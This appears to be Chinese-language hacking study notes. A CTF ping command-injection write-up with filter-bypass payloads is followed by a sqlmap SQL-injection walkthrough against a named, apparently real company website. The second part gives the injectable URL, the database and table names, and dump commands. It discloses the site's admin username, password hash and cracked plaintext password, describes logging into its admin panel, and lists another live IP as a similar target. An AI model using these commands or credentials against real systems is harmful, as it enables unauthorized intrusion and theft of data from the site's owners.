webPing？？

Ping？？？？ 命令注入

先看看网页源代码，没有收获

输入本机地址127.0.0.1试试

ping通了

找找有没有flag

查看当前目录127.0.0.1; ls

找到了flag文件，尝试读取
127.0.0.1; cat flag.txt
发现被过滤，绕过过滤
输入：127.0.0.1; cat “flag.txt”（引号绕过）—无果
输入：127.0.0.1; a=flag; b=.txt; cat $a$b（变量拼接）—无果
输入：127.0.0.1; cat fla*（使用通配符）—成功
flag{dd4adb53-4a00-43a4-b000-1ab3dcdd263e}

总结

先看网页源代码
输入本机地址查看是否能ping通
查找当前目录（127.0.0.1; ls）、查找隐藏目录（127.0.0.1; ls -la）、查找根目录（127.0.0.1; ls /）
找到flag.txt
绕过过滤获得flag

SQL注入漏洞（工具注入）

前置准备sqlmap.py

在文件夹中找到sqlmap.py

路径中输入cmd并回车，Windows系统的命令行

网址http://www.dlhayashi.com/
登陆点http://www.dlhayashi.com/admin/

具体步骤

找交互点

1.具有GET请求的URL ?关键词=值 类似于?id=14 ?keyword=aaa
2.登录框
3.搜索框

验证注入点

采用最简单的恶意语句 ？id=aaa’ 尝试传输，查看页面回显是否是我们想要的效果
–数据库会报错 –无法正常查询数据 –页面将会异常回显(空白/回显SQL的报错)
例如

挖数据库名称（database或是db）、数据表名称（table）、数据列名称（column）

注：从此处开始要用到sqlmap.py
数据库名称
输入python sqlmap.py -u “http://www.dlhayashi.com/index.php?c=news&a=show&id=8“ –current-db

注释

-u — 指定具有注入点的URL
–current-db — 挖出当前网站的数据库名称

输入后按回车，遇到y/n写y并回车
在ending上方3到5行可以找到挖出的东西

数据表名称
输入python sqlmap.py -u “http://www.dlhayashi.com/index.php?c=news&a=show&id=8“ -D qdm177261645_db –tables

注释

-D — 指定要攻击的数据库名称
–tables — 挖出当前网站数据库中所有的数据表名称


一般挖admin管理员
数据列名称
输入python sqlmap.py -u “http://www.dlhayashi.com/index.php?c=news&a=show&id=8“ -D qdm177261645_db -T jm_admin –columns

挖数据
输入python sqlmap.py -u “http://www.dlhayashi.com/index.php?c=news&a=show&id=8“ -D qdm177261645_db -T jm_admin -C username,password –dump

注:
用户名：admin
密码： 1c63129ae9db9c60c3e8aa94d3e00495 — 数据库中本身保存的密文密码 — 密文密码无法直接登录
1qaz2wsx — sqlmap帮你解码出来的明文密码 明文密码可以直接登录

进入登入点http://www.dlhayashi.com/admin/

输入账号与密码成功进入

同类型的网站

http://43.139.231.237:34021/
